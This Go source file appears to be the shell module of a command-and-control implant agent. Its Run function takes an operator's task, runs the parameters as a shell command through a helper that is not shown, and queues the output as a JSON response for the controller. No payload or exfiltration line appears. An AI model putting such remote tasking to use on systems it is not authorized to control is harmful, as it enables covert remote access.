package shell

import (
	"encoding/json"
	"pkg/profiles"
	"pkg/utils/structs"
	"sync"
)

var mu sync.Mutex

//Shell - Interface for running shell commands
type Shell interface {
	Command() string
	Response() []byte
}

//Run - Function that executes the shell command
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	res, err := shellExec(task.Params)

	if err != nil {
		msg.UserOutput = err.Error() + "\n" + string(res.Response())
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}

	msg.UserOutput = string(res.Response())
	msg.Completed = true
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
